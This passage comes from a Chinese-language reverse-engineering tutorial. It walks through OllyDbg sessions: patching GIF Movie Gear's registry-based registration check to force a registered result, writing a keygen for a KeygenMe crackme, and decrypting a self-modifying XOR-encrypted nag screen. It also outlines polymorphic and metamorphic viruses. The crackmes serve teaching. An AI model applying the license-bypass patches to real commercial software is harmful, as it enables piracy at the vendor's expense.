%}\n\n知道对话框的编号为100，16进制为0x64，寻找`push 0x64`时却发现不止一个地址，右键->在每个命令上设置断点。重载运行，点关闭时停下的断点才是我们要找的。\n\n```asm\n00406707   > \\6A 00         push 0x0\n00406709   .  6A 00         push 0x0\n0040670B   .  E8 30AF0200   call movgear.00431640\n00406710   .  83C4 08       add esp,0x8\n00406713   .  83F8 01       cmp eax,0x1\n00406716   .  74 16         je short movgear.0040672E\n00406718   .  A1 68854600   mov eax,dword ptr ds:[0x468568]\n0040671D   .  6A 01         push 0x1                                 ; /lParam = 00000001\n0040671F   .  68 D0E84000   push movgear.0040E8D0                    ; |DlgProc = movgear.0040E8D0\n00406724   .  56            push esi                                 ; |hOwner = 00110402 ('GIF Movie Gear',class='GIF Movie Gear')\n00406725   .  6A 64         push 0x64                                ; |pTemplate = 0x64\n00406727   .  50            push eax                                 ; |hInst = 00400000\n00406728   .  FF15 0C834400 call dword ptr ds:[<&USER32.DialogBoxPar>; \\DialogBoxParamA\n0040672E   >  8B8C24 B80000>mov ecx,dword ptr ss:[esp+0xB8]\n```\n\n往上看跳转和call指令，在0040670B处下断点，步入。粗略看下函数，只有一个返回的地方。\n\n```asm\n0043173E  |.  8BC3          mov eax,ebx                              ;  movgear.00406170\n00431740  |.  5E            pop esi                                  ;  movgear.00406710\n00431741  |.  5B            pop ebx                                  ;  movgear.00406710\n00431742  |.  81C4 D0000000 add esp,0xD0\n00431748  \\.  C3            retn\n```\n\n可知eax的值是ebx赋给它的，往上找ebx只找到一处。\n\n```asm\n004316C7  |.  51            push ecx                                 ;  movgear.00406170\n004316C8  |.  52            push edx\n004316C9  |.  E8 B2FEFFFF   call movgear.00431580;验证函数\n004316CE  |.  83C4 08       add esp,0x8\n004316D1  |.  85C0          test eax,eax\n004316D3  |.  74 5D         je short movgear.00431732\n004316D5  |.  8B9424 E00000>mov edx,dword ptr ss:[esp+0xE0]          ;  user32.758C67DC\n004316DC  |.  BB 01000000   mov ebx,0x1\n```\n\nje不能跳转，一跳转就不能让ebx=1了，所以可以猜测je上面的call指令就是调用验证是否注册的函数。在004316C9下断点，发现没经过就直接弹窗了。从函数开头下断点，F8一步步走。\n\n```asm\n00431697  |.  85C0          test eax,eax\n00431699  |.  0F85 93000000 jnz movgear.00431732\n```\n\n发现00431699跳转直接跳过了验证函数。走到`mov ebx,0x1`好像挺多要改的，那就不去了，直接在退出函数前改eax的值。因为只有两个字节可以修改，而`mov eax,1`占5个字节，那就修改al的值，因为返回值准确来说是存放在al中。\n\n```asm\n0043173E  |.  8BC3          mov eax,ebx \t=>\t\tmov al,1\n```\n\n也可以从几个常用的函数推测004316C9是验证函数地址。\n\n### 25.1 RegOpenKeyEx\n\n函数功能：用于打开一个指定的注册表键。\n\n注册表可以理解为Windows数据库，Windows通过注册表写入软件的版本信息，运行状态等。\n\n```c\nLONG RegOpenKeyEx(\n    HKEY hKey, // 需要打开的主键的名称\n    LPCTSTR lpSubKey, //需要打开的子键的名称\n    DWORD ulOptions, // 保留，设为0\n    REGSAM samDesired, // 安全访问标记，也就是权限\n    PHKEY phkResult // 得到的将要打开键的句柄\n);\n```\n\n### 25.2 RegQueryValueEx\n\n函数功能：检索一个已打开的注册表句柄中，指定的注册表键的类型和设置值。\n\n这个函数是从注册表里取出数据，传到lpdata里去。\n\n```c\nLONG WINAPI RegQueryValueEx(\n    HKEY hKey,            // handle to key\n    LPCTSTR lpValueName,  // value name\n    LPDWORD lpReserved,   // reserved\n    LPDWORD lpType,       // type buffer\n    LPBYTE lpData,        // data buffer\n    LPDWORD lpcbData      // size of data buffer\n);\n```\n\n### 25.3 RegCloseKey\n\n函数功能：释放指定注册键的句柄。\n\n```c\nLONG RegCloseKey(\n\tHKEY hKey // 释放键的句柄\n);\n```\n\n在0040670B处进入函数\n\n```asm\n0043164D  |.  50            push eax                                 ; /pHandle = NULL\n0043164E  |.  68 19000200   push 0x20019                             ; |Access = KEY_READ\n00431653  |.  6A 00         push 0x0                                 ; |Reserved = 0x0\n00431655  |.  68 F8B34400   push movgear.0044B3F8                    ; |Subkey = \"Software\\gamani\\GIFMovieGear\\2.0\"\n0043165A  |.  68 01000080   push 0x80000001                          ; |hKey = HKEY_CURRENT_USER\n0043165F  |.  83CB FF       or ebx,-0x1                              ; |\n00431662  |.  FF15 00804400 call dword ptr ds:[<&ADVAPI32.RegOpenKey>; \\RegOpenKeyExA\n00431668  |.  85C0          test eax,eax\n0043166A  |.  0F85 C2000000 jnz movgear.00431732\n00431670  |.  8D4C24 10     lea ecx,dword ptr ss:[esp+0x10]\n00431674  |.  8B35 04804400 mov esi,dword ptr ds:[<&ADVAPI32.RegQuer>;  apphelp.6CB30350\n0043167A  |.  8D5424 14     lea edx,dword ptr ss:[esp+0x14]\n0043167E  |.  51            push ecx                                 ; /pBufSize = movgear.00406170\n0043167F  |.  52            push edx                                 ; |Buffer = NULL\t\t;lpData,edx=esp+0x14,存的是注册名\n00431680  |.  50            push eax                                 ; |pValueType = NULL\n00431681  |.  50            push eax                                 ; |Reserved = NULL\n00431682  |.  8B4424 1C     mov eax,dword ptr ss:[esp+0x1C]          ; |\n00431686  |.  BF 64000000   mov edi,0x64                             ; |\n0043168B  |.  68 98D44400   push movgear.0044D498                    ; |ValueName = \"RegName3\"\n00431690  |.  50            push eax                                 ; |hKey = 0x0\t\t\t;6个push传入API函数的6个参数\n00431691  |.  897C24 28     mov dword ptr ss:[esp+0x28],edi          ; |\n00431695  |.  FFD6          call esi                                 ; \\RegQueryValueExA\n00431697  |.  85C0          test eax,eax\n00431699      0F85 93000000 jnz movgear.00431732\n0043169F  |.  8D4C24 10     lea ecx,dword ptr ss:[esp+0x10]\n004316A3  |.  8D5424 78     lea edx,dword ptr ss:[esp+0x78]\n004316A7  |.  51            push ecx                                 ; /pBufSize = movgear.00406170\n004316A8  |.  52            push edx                                 ; |Buffer = NULL\t;lpData,edx=esp+0x78,存的是密码\n004316A9  |.  50            push eax                                 ; |pValueType = NULL\n004316AA  |.  50            push eax                                 ; |Reserved = NULL\n004316AB  |.  8B4424 1C     mov eax,dword ptr ss:[esp+0x1C]          ; |\n004316AF  |.  68 A4D44400   push movgear.0044D4A4                    ; |ValueName = \"RegCode3\"\n004316B4  |.  50            push eax                                 ; |hKey = 0x0\t\t\n004316B5  |.  897C24 28     mov dword ptr ss:[esp+0x28],edi          ; |\n004316B9  |.  FFD6          call esi                                 ; \\RegQueryValueExA\n004316BB  |.  85C0          test eax,eax\n004316BD  |.  75 73         jnz short movgear.00431732\n004316BF  |.  8D4C24 78     lea ecx,dword ptr ss:[esp+0x78];密码\n004316C3  |.  8D5424 14     lea edx,dword ptr ss:[esp+0x14];注册名\n004316C7  |.  51            push ecx                                 ;  movgear.00406170\n004316C8  |.  52            push edx\n004316C9  |.  E8 B2FEFFFF   call movgear.00431580\n;将注册名和密码进栈，所以这个函数肯定是验证函数\n```\n\n## 26. Keygen(注册机)\n\nKey Generator，是软件注册生成所需的注册码或序列号的程序。Keygen可独立作为一个可执行程序存在，也可以作为程序的一个模块实现。主要功能是利用已经安排好的算法计算出独一无二的序列号(注册码)等。\n\n## 27. 实验十六 KeygenMe\n\n{% asset_img 实验16.png 实验16 %}\n\n目标：逆向算法破解注册机。\n\n程序是一个对话框获取字符串，可以在command里输入`bp GetDlgItemTextA`或Ctrl+G查找API函数下断点，断在了DLL领空。F9运行，输入字符串，停在断点处，因为在DLL领空，我们不能做任何修改。一路F8走到返回指令，或Alt+F9返回到用户代码，再或在堆栈窗口右键->反汇编窗口中跟随，都可以到达父函数。\n\n```asm\n004012B1  |.  6A 1A         push 0x1A                                ; /Count = 1A (26.)\n004012B3  |.  68 38304000   push KeygenMe.00403038                   ; |Buffer = KeygenMe.00403038\n004012B8  |.  6A 6A         push 0x6A                                ; |ControlID = 6A (106.)\n004012BA  |.  FF75 08       push [arg.1]                             ; |hWnd = 000905F0 (' Tut selfkeygenMe ',class='lena151')\n004012BD  |.  E8 08010000   call <jmp.&USER32.GetDlgItemTextA>       ; \\GetDlgItemTextA\n004012C2  |.  83F8 00       cmp eax,0x0\n004012C5  |.  74 18         je short KeygenMe.004012DF\n004012C7  |.  6A 1A         push 0x1A                                ; /Count = 1A (26.)\n004012C9  |.  68 38314000   push KeygenMe.00403138                   ; |Buffer = KeygenMe.00403138\n004012CE  |.  6A 6B         push 0x6B                                ; |ControlID = 6B (107.)\n004012D0  |.  FF75 08       push [arg.1]                             ; |hWnd = 000905F0 (' Tut selfkeygenMe ',class='lena151')\n004012D3  |.  E8 F2000000   call <jmp.&USER32.GetDlgItemTextA>       ; \\GetDlgItemTextA\n004012D8  |.  83F8 00       cmp eax,0x0\n004012DB  |.  74 02         je short KeygenMe.004012DF\n004012DD  |.  EB 17         jmp short KeygenMe.004012F6\n004012DF  |>  6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n004012E1  |.  68 62344000   push KeygenMe.00403462                   ; |Title = \"KeyGen lena151   \"\n004012E6  |.  68 00304000   push KeygenMe.00403000                   ; |Text = \"    Give me more material hehe!!\"\n004012EB  |.  6A 00         push 0x0                                 ; |hOwner = NULL\n004012ED  |.  E8 FC000000   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n004012F2  |.  C9            leave\n004012F3  |.  C2 1000       retn 0x10\n```\n\n刚才是进入了004012BD地址的函数，看到下面还有一个`GetDlgItemTextA`，说明还要进入一次刚才的断点处。结合上面整段代码来看，第一次存入第一个框的内容，第二次存入第二个框的内容，两个`GetDlgItemTextA`下面的je跳转是判断用户是否输入字符串，没有就跳到`MessageBoxA`处。如果两个框都有输入，则跳到下面的代码处。\n\n```asm\n004012F6  |> \\68 38304000   push KeygenMe.00403038                   ; /String = \"\"\t\t将第一个框的内容压栈\n004012FB  |.  E8 30010000   call <jmp.&kernel32.lstrlen>             ; \\lstrlenA\t\t获取字符串长度\n00401300  |.  33F6          xor esi,esi;esi清零\n00401302  |.  8BC8          mov ecx,eax;字符串长度作为循环次数,i\n00401304  |.  B8 01000000   mov eax,0x1;eax=1\n00401309  |>  8B15 38304000 /mov edx,dword ptr ds:[0x403038]\n;第一个字符传给edx\n0040130F  |.  8A90 37304000 |mov dl,byte ptr ds:[eax+0x403037]\n;第一个字符传给dl\n00401315  |.  81E2 FF000000 |and edx,0xFF\n0040131B  |.  8BDA          |mov ebx,edx\n0040131D  |.  0FAFDA        |imul ebx,edx\n00401320  |.  03F3          |add esi,ebx                             ;  KeygenMe.004011E2\n00401322  |.  8BDA          |mov ebx,edx\n00401324  |.  D1FB          |sar ebx,1\n00401326  |.  83C3 03       |add ebx,0x3\n00401329  |.  0FAFDA        |imul ebx,edx\n0040132C  |.  2BDA          |sub ebx,edx\n0040132E  |.  03F3          |add esi,ebx                             ;  KeygenMe.004011E2\n00401330  |.  03F6          |add esi,esi\n00401332  |.  40            |inc eax\t\t;eax++\n00401333  |.  49            |dec ecx        ;i--                     ;  KeygenMe.004011E2\n00401334  |.^ 75 D3         \\jnz short KeygenMe.00401309\n00401336  |.  3B35 38314000 cmp esi,dword ptr ds:[0x403138]\n;匹配第二个框的内容，esi从上面的算法得出，所以第一个框和第二个框其实是有关联的\n;这个是注册机，对它进行爆破没有意义，我们想要的是它得出的序列号\n0040133C  |.  75 15         jnz short KeygenMe.00401353\n0040133E  |.  6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n00401340  |.  68 62344000   push KeygenMe.00403462                   ; |Title = \"KeyGen lena151   \"\n00401345  |.  68 B8344000   push KeygenMe.004034B8                   ; |Text = \" That's right. (Self)keygen me now!\"\n0040134A  |.  6A 00         push 0x0                                 ; |hOwner = NULL\n0040134C  |.  E8 9D000000   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n00401351  |. /EB 13         jmp short KeygenMe.00401366\n00401353  |> |6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n00401355  |. |68 62344000   push KeygenMe.00403462                   ; |Title = \"KeyGen lena151   \"\n0040135A  |. |68 86344000   push KeygenMe.00403486                   ; |Text = \" Error detected! Remove debugger from Hard Drive \"\n0040135F  |. |6A 00         push 0x0                                 ; |hOwner = NULL\n00401361  |. |E8 88000000   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n00401366  |> \\EB 15         jmp short KeygenMe.0040137D\n00401368  |>  FF75 14       push [arg.4]                             ; /lParam = 0x20582\n0040136B  |.  FF75 10       push [arg.3]                             ; |wParam = 6C (108.)\n0040136E  |.  FF75 0C       push [arg.2]                             ; |Message = WM_COMMAND\n00401371  |.  FF75 08       push [arg.1]                             ; |hWnd = 000D0262 (' Tut selfkeygenMe ',class='lena151')\n00401374  |.  E8 3F000000   call <jmp.&USER32.DefWindowProcA>        ; \\DefWindowProcA\n00401379  |.  C9            leave\n0040137A  |.  C2 1000       retn 0x10\n0040137D  |>  33C0          xor eax,eax\n0040137F  |.  C9            leave\n00401380  \\.  C2 1000       retn 0x10\n```\n\n方法一：用Inline patch将算出来的序列号存入数据段，把数据压入提示错误的MessageBoxA，因为我们输入的序列号肯定是错误的，弹框出来肯定是提示错误的弹窗，这样我们压入的数据就可以显示出来。\n\n在数据窗口看到一堆的00，选中一个右键->断点->硬件写入->Dword，比如439000地址。也可以点击M图标在数据段找空白处。重载运行一下确保这个地址没有被使用。\n\n在反汇编窗口找空白代码处，比如40138D。编写汇编代码\n\n```asm\nmov dword ptr [439000],esi\njmp 401353\n```\n\n在0040133C处修改代码\n\n```asm\njnz short KeygenMe.00401353\t\t=>\t\tjmp 40138D\n```\n\n在0040135A处修改代码\n\n```asm\npush KeygenMe.00403486\t\t=>\t\tpush 439000\n```\n\n保存文件，运行，序列号竟然是乱码。\n\n{% asset_img 实验16.1.png 实验16.1 %}\n\n载入OD查看439000地址的HEX数据是3b92d6，也就是上面乱码字符的ASCII码的16进制形式，也可以看esi也是3b92d6。\n\n```asm\n00439000  D6 92 3B 00                                        謷;\n```\n\n弹窗复制不了，只能复制OD里面的了！回到原始程序，注册成功。\n\n{% asset_img 实验16.2.png 实验16.2 %}\n\n方法二：逆向算法\n\n```asm\n004012F6  |> \\68 38304000   push KeygenMe.00403038                   ; /String = \"v5le0n9\"\t\t将第一个框的内容压栈\n004012FB  |.  E8 30010000   call <jmp.&kernel32.lstrlen>             ; \\lstrlenA\t\t获取字符串长度\n00401300  |.  33F6          xor esi,esi;esi清零\n00401302  |.  8BC8          mov ecx,eax;字符串长度作为循环次数,i=7\n00401304  |.  B8 01000000   mov eax,0x1;eax=1\n00401309  |>  8B15 38304000 /mov edx,dword ptr ds:[0x403038]\n;edx=656c3576,0x76=v,0x35=5,0x6c=l,0x65=e\n0040130F  |.  8A90 37304000 |mov dl,byte ptr ds:[eax+0x403037]\n;dl=0x76=v\n00401315  |.  81E2 FF000000 |and edx,0xFF\n;给edx的高24位清零，edx=00000076\n0040131B  |.  8BDA          |mov ebx,edx\n;ebx=edx=00000076\n0040131D  |.  0FAFDA        |imul ebx,edx\n;ebx*=edx='v'*'v'\n00401320  |.  03F3          |add esi,ebx                             ;  KeygenMe.004011E2\t\tesi+=ebx,即esi='v'*'v'\n00401322  |.  8BDA          |mov ebx,edx\n;ebx=edx=0x76\n00401324  |.  D1FB          |sar ebx,1\n;右移一位，相当于除以2，ebx=ebx/2='v'/2\n00401326  |.  83C3 03       |add ebx,0x3\n;ebx+=3,ebx='v'/2+3\n00401329  |.  0FAFDA        |imul ebx,edx\n;ebx=ebx*edx=('v'/2+3)*'v'\n0040132C  |.  2BDA          |sub ebx,edx\n;ebx=ebx-edx=('v'/2+3)*'v'-'v'\n0040132E  |.  03F3          |add esi,ebx; KeygenMe.004011E2\n;esi+=('v'/2+3)*'v'-'v',esi='v'*'v'+('v'/2+3)*'v'-'v'\n00401330  |.  03F6          |add esi,esi;esi=esi*2\n00401332  |.  40            |inc eax\t\t;eax++\n00401333  |.  49            |dec ecx        ;i--                     ;  KeygenMe.004011E2\n00401334  |.^ 75 D3         \\jnz short KeygenMe.00401309\n```\n\nexp\n\n```c\n#include<stdio.h>\nint main()\n{\n    char name[]=\"v5le0n9\";\n    int i;\n    int result=0;\n    for(i=0; i<7; i++)\n    {\n        result += name[i]*name[i]+(name[i]/2+3)*name[i]-name[i];\n\t\tresult += result;       \n    }\n    printf(\"%d\",result);\n}\n//3904214=0x3b92d6\n```\n\n用工具转换不了字符串的话，就直接在数据窗口一段00处打16进制，ASCII码窗口就会显示你所要的字符串。\n\n## 28. 多态和变形\n\n### 28.1 多态\n\n多态是第一种对杀毒软件造成严重威胁的技术。一个多态病毒在触发时由解密模块进行解密，在感染时由加密模块进行加密并感染，但其加密模块在每一次的感染中会有所修改。因此，一个仔细设计的多态病毒在每一次感染中没有一部分是相同的。这使得使用病毒特征码进行侦测变得困难。杀毒软件必须在模拟器上对该病毒解密进而侦测该病毒，或是利用加密病毒其统计样板上的分析。\n\n### 28.2 变形\n\n变形病毒为了避免被杀毒软件通过模拟环境或“蜜罐”系统查杀，在每一次感染都完全将其自身改写。有些变形病毒可以感染多个操作系统，如Simile病毒可以感染Windows的PE文件和Linux的ELF文件。变形病毒要达到可变形，一个变形引擎是必需的。一个变形病毒通常非常庞大且复杂，如Simile病毒包含了14000行汇编语言，其中90%都是变形引擎。\n\n### 28.3 XOR指令\n\n加密最基础的指令\n\n```\n如果A xor B = C\n则  C xor B = A\n```\n\n## 29. 实验十七 ReverseMe Tutorial\n\n{% asset_img 实验17.png 实验17 %}\n\n{% asset_img 实验17.1.png 实验17.1 %}\n\n目标：\n\n{% asset_img 实验17.2.png 实验17.2 %}\n\nWin32汇编编写的程序，32位可执行文件。(用汇编写代码nb)\n\n载入OD，在反汇编窗口就可看到NAG窗口的字符串，看不到的话就搜索字符串定位。\n\n```asm\n00401288 > $  6A 00         push 0x0\n0040128A      E8            db E8\n0040128B      EF            db EF\n0040128C      FF            db FF\n0040128D      FF            db FF\n0040128E      FF            db FF\n0040128F      A3            db A3\n00401290      30314000      dd ReverseM.00403130\n00401294   .  BF 11104000   mov edi,ReverseM.00401011\n00401299   .  E8 71000000   call ReverseM.0040130F\n0040129E   >  E8 6EFDFFFF   call ReverseM.00401011\n004012A3   .  33C0          xor eax,eax\n004012A5   .  50            push eax\n004012A6   .  57            push edi                                 ;  ReverseM.<ModuleEntryPoint>\n004012A7   .^ 7C F5         jl short ReverseM.0040129E\n004012A9   .^ 0F84 51FDFFFF je ReverseM.00401000\n004012AF   .  6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n004012B1   .  68 7D314000   push ReverseM.0040317D                   ; |Title = \"TutorialNag\"\n004012B6   .  68 34314000   push ReverseM.00403134                   ; |Text = \"You need to remove the nag\nTry to do it in a two byte patch. \nRegards!\"\n004012BB   .  6A 00         push 0x0                                 ; |hOwner = NULL\n004012BD   .  E8 92FFFFFF   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n```\n\n在004012AF处下断点，运行试试，发现还没跑到断点处就弹出NAG，说明这个`MessageBoxA`是作者误导人的。观察一下函数的入口处，我们之前的程序大多是55作为函数的开头，这个是6A00开头。而且接下来的不像是指令，更像是数据段存放的数据，F8步过还会跳转(128A跳转到128F)，这是因为OD自动帮我们分析这个程序，右键->分析->从模块中删除分析，就可看到汇编指令。\n\n```asm\n00401288 >  6A 00           push 0x0\n0040128A    E8 EFFFFFFF     call <jmp.&KERNEL32.GetModuleHandleA>\n0040128F    A3 30314000     mov dword ptr ds:[0x403130],eax          ; ReverseM.00400000\n00401294    BF 11104000     mov edi,ReverseM.00401011\n00401299    E8 71000000     call ReverseM.0040130F\n0040129E    E8 6EFDFFFF     call ReverseM.00401011\n004012A3    33C0            xor eax,eax                              ; ReverseM.00400000\n004012A5    50              push eax                                 ; ReverseM.00400000\n004012A6    57              push edi                                 ; ReverseM.<ModuleEntryPoint>\n004012A7  ^ 7C F5           jl short ReverseM.0040129E\n004012A9  ^ 0F84 51FDFFFF   je ReverseM.00401000\n004012AF    6A 00           push 0x0\n004012B1    68 7D314000     push ReverseM.0040317D                   ; ASCII \"TutorialNag\"\n004012B6    68 34314000     push ReverseM.00403134                   ; ASCII \"You need to remove the nag\\r\\nTry to do it in a two byte patch. \\r\\nRegards!\"\n004012BB    6A 00           push 0x0\n004012BD    E8 92FFFFFF     call <jmp.&USER32.MessageBoxA>\n```\n\n从头开始F8步过，发现在0040129E地址处就弹出NAG。下断点进入函数。\n\n```asm\n00401011   $  33C0          xor eax,eax                              ;  ReverseM.00401218\t;edi=401011\n00401013   .  66:C707 6A00  mov word ptr ds:[edi],0x6A\n;将0x6A赋值给edi,这个401011地址处的机器码改为6A00\n00401018   .  83C7 02       add edi,0x2\n0040101B   .  C707 687D3040 mov dword ptr ds:[edi],0x40307D68\n00401021   .  83C7 04       add edi,0x4\n00401024   .  C607 00       mov byte ptr ds:[edi],0x0\n00401027   .  47            inc edi                                  ;  ReverseM.00401011\n00401028   .  C707 68343040 mov dword ptr ds:[edi],0x40303468\n0040102E   .  83C7 04       add edi,0x4\n00401031   .  C607 00       mov byte ptr ds:[edi],0x0\n00401034   .  47            inc edi                                  ;  ReverseM.00401011\n00401035   .  66:C707 6A00  mov word ptr ds:[edi],0x6A\n0040103A   .  83C7 02       add edi,0x2\n0040103D   .  C707 E8300200 mov dword ptr ds:[edi],0x230E8\n00401043   .  83C7 04       add edi,0x4\n00401046   .  C607 00       mov byte ptr ds:[edi],0x0\n00401049   .  47            inc edi                                  ;  ReverseM.00401011\n0040104A   .  66:C707 EB44  mov word ptr ds:[edi],0x44EB\n0040104F   .  83EF 24       sub edi,0x24\n00401052   .  FFD7          call edi                                 ;  ReverseM.00401011\n00401054   .  E8 C7020000   call ReverseM.00401320\n00401059   .  E8 64020000   call ReverseM.004012C2\n0040105E   .  EB 15         jmp short ReverseM.00401075\n```\n\n往后走下的每一步，都会修改上一步的代码，光标到40104F地址代码变化如下(因为如果过了0040104F就会弹出NAG了，40104F变成了40104B和401051)：\n\n```asm\n00401011   .  6A 00         push 0x0\n00401013   ?  68 7D304000   push ReverseM.0040307D\n00401018   ?  68 34304000   push ReverseM.00403034\n0040101D   .  6A 00         push 0x0\n0040101F   .  E8 30020000   call <jmp.&USER32.MessageBoxA>\n00401024   ?  EB 44         jmp short ReverseM.0040106A\n00401026   ?  0047 C7       add byte ptr ds:[edi-0x39],al\n00401029   ?  07            pop es\n0040102A   ?  68 34304083   push 0x83403034\n0040102F   ?  C704C6 070047>mov dword ptr ds:[esi+eax*8],0x66470007\n00401036   ?  C707 6A0083C7 mov dword ptr ds:[edi],0xC783006A\n0040103C   ?  02C7          add al,bh\n0040103E   ?  07            pop es\n0040103F   ?  E8 30020083   call 83401274\n00401044   ?  C704C6 070047>mov dword ptr ds:[esi+eax*8],0x66470007\n0040104B   ?  C707 EB4483EF mov dword ptr ds:[edi],0xEF8344EB\n00401051   ?  24 FF         and al,0xFF\n00401053   ?  D7            xlat byte ptr ds:[ebx+al]\n00401054   ?  E8 C7020000   call ReverseM.00401320\n00401059   .  E8 64020000   call ReverseM.004012C2\n0040105E   .  EB 15         jmp short ReverseM.00401075\n```\n\n右键->分析->分析代码(快捷键Ctrl+A)，发现401011处竟然出现了`MessageBoxA`，40104F又回来了。\n\n```asm\n00401011   $  6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n00401013   .  68 7D304000   push ReverseM.0040307D                   ; |Title = \"缙擒邻疫猿竟嶂捃胖撉壑撦以撜淋迵芹謸嶂胖晾筑譂摼国菗幸輷阎撟茌謸谳撘撉能撗是掷撁仪雄潛竟衿菗峙至蕮芮壑翐儡咂勤茌撢罁遮葜澗咕圭圳罁嶂胖晾筑謸诶撁伊菗苷撘撉魄芰谝邼擌葙苁?\n00401018   .  68 34304000   push ReverseM.00403034                   ; |Text = \"贶茡葜肿撉軗林捃胖撉壑撦以竟缌蕮擒撟軗谇撢輷覔悄軗咽侵撁仪雄潛竟嶂砸磷罀崇魄芰谝啐以尘贯洲芘謸芹謸菀該樟苻撉壑撫峙至乐潛竟撔逸撗謸总葜撢輷覔悄軗咽侵罁靡切蹪摼柜魄撝胖潦撥芹至摾苓魄谲輷诶撜谳譂竟竟幺诶撫峙至乐撢罁靡燎撥論覔瞧擒邻?...\n0040101D   .  6A 00         push 0x0                                 ; |hOwner = NULL\n0040101F   .  E8 30020000   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n00401024   .  EB 44         jmp short ReverseM.0040106A\n00401026      00            db 00\n00401027   .  47            inc edi                                  ;  ReverseM.00401024\n00401028   .  C707 68343040 mov dword ptr ds:[edi],0x40303468\n0040102E   .  83C7 04       add edi,0x4\n00401031   .  C607 00       mov byte ptr ds:[edi],0x0\n00401034   .  47            inc edi                                  ;  ReverseM.00401024\n00401035   .  66:C707 6A00  mov word ptr ds:[edi],0x6A\n0040103A   .  83C7 02       add edi,0x2\n0040103D   .  C707 E8300200 mov dword ptr ds:[edi],0x230E8\n00401043   .  83C7 04       add edi,0x4\n00401046   .  C607 00       mov byte ptr ds:[edi],0x0\n00401049   .  47            inc edi                                  ;  ReverseM.00401024\n0040104A   .  66:C707 EB44  mov word ptr ds:[edi],0x44EB\n0040104F   .  83EF 24       sub edi,0x24\n00401052   .  FFD7          call edi                                 ;  ReverseM.00401024\tedi=401000\n00401054   .  E8 C7020000   call ReverseM.00401320\n00401059   .  E8 64020000   call ReverseM.004012C2\n0040105E   .  EB 15         jmp short ReverseM.00401075\n```\n\n步入`call edi`指令，去到401000处。F8走走发现第3行到第8行在执行一个循环。\n\n```asm\n00401000   > /B8 00304000   mov eax,ReverseM.00403000\n;eax=403000,存的是代码段的地址\n00401005   > |8030 B3       xor byte ptr ds:[eax],0xB3\n;代码段的地址与0xb3异或，即这条指令在修改自身的代码，可以在数据窗口定位到403000观察数据变化\n00401008   . |40            inc eax\n00401009   . |3D 28314000   cmp eax,ReverseM.00403128\n;403000到403128这段代码分别与0xb3按字节进行异或(解密过程)\n0040100E   .^|7C F5         jl short ReverseM.00401005\n00401010   . |40            inc eax\n00401011   $ |6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n00401013   . |68 7D304000   push ReverseM.0040307D                   ; |Title = \"缙擒邻疫猿竟嶂捃胖撉壑撦以撜淋迵芹謸嶂胖晾筑譂摼国菗幸輷阎撟茌謸谳撘撉能撗是掷撁仪雄潛竟衿菗峙至蕮芮壑翐儡咂勤茌撢罁遮葜澗咕圭圳罁嶂胖晾筑謸诶撁伊菗苷撘撉魄芰谝邼擌葙苁?\n00401018   . |68 34304000   push ReverseM.00403034                   ; |Text = \"贶茡葜肿撉軗林捃胖撉壑撦以竟缌蕮擒撟軗谇撢輷覔悄軗咽侵撁仪雄潛竟嶂砸磷罀崇魄芰谝啐以尘贯洲芘謸芹謸菀該樟苻撉壑撫峙至乐潛竟撔逸撗謸总葜撢輷覔悄軗咽侵罁靡切蹪摼柜魄撝胖潦撥芹至摾苓魄谲輷诶撜谳譂竟竟幺诶撫峙至乐撢罁靡燎撥論覔瞧擒邻?...\n0040101D   . |6A 00         push 0x0                                 ; |hOwner = NULL\n0040101F   . |E8 30020000   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n```\n\n而乱码的Title和Text的地址就在403000到403128之中，等循环走完，乱码的Title和Text解密解出来有意义的字符串。\n\n```asm\n00401011   $  6A 00         push 0x0                                 ; /Style = MB_OK|MB_APPLMODAL\n00401013   .  68 7D304000   push ReverseM.0040307D                   ; |Title = \"TutorialNag\"\n00401018   .  68 34304000   push ReverseM.00403034                   ; |Text = \"You need to remove the nag\nTry to do it in a two byte patch. \nRegards!\"\n0040101D   .  6A 00         push 0x0                                 ; |hOwner = NULL\n0040101F   .  E8 30020000   call <jmp.&USER32.MessageBoxA>           ; \\MessageBoxA\n```\n\n可见作者是不想我们通过字符串搜索查找出破解的线索，通过异或的方式进行加密。我们不能用nop方式消除NAG，因为这是解密之后的代码，如果全都nop掉，解密前的代码会受到影响，程序不能正常执行。并且由于它改的范围有点大，逆向回去不太好逆。我们之前还学过一种方法去除NAG：将它的父句柄修改，让它找不到父句柄，即`push 0x1`。\n\n直接修改肯定不行，那从头开始走一遍，不放过经过的每个call指令(API函数的call不跟进)，了解它的加解密过程。\n\n1. 00401299地址的call指令：解密401000到401218，xor 0x5A\n\n```asm\n0040130F  /$  B8 00104000   mov eax,ReverseM.00401000\n00401314  |>  8030 5A       xor byte ptr ds:[eax],0x5A\n00401317  |.  40            inc eax                                  ;  ReverseM.00401001\n00401318  |.  3D 18124000   cmp eax,<jmp.&USER32.BeginPaint>         ;  入口地址\t401218\n0040131D  |.^ 7C F5         jl short ReverseM.00401314\n0040131F  \\.  C3            retn\n```\n\n2. 0040129E地址的call指令：修改自身代码，401011到401025\n\n```asm\n0040104A   .  66:C707 EB44  mov word ptr ds:[edi],0x44EB\n;在401024位置写入两个数据，也就是修改到401025位置\n```\n\n3. 00401052地址的call指令：对NAG窗口加密的标题和文本进行解密，403000到403128，xor 0xB3\n\n4. 修改自身代码，401011到401027\n\n```asm\n0040106A   > \\83C7 11       add edi,0x11\n;edi=401011\n0040106D   .  66:C707 6A0A  mov word ptr ds:[edi],0xA6A\n00401072   .  83C7 02       add edi,0x2\n00401075   >  C707 FF353431 mov dword ptr ds:[edi],0x313435FF\n0040107B   .  83C7 04       add edi,0x4\n0040107E   .  66:C707 4000  mov word ptr ds:[edi],0x40\n00401083   .  83C7 02       add edi,0x2\n00401086   .  66:C707 6A00  mov word ptr ds:[edi],0x6A\n0040108B   .  83C7 02       add edi,0x2\n0040108E   .  C707 FF353031 mov dword ptr ds:[edi],0x313035FF\n00401094   .  83C7 04       add edi,0x4\n00401097   .  66:C707 4000  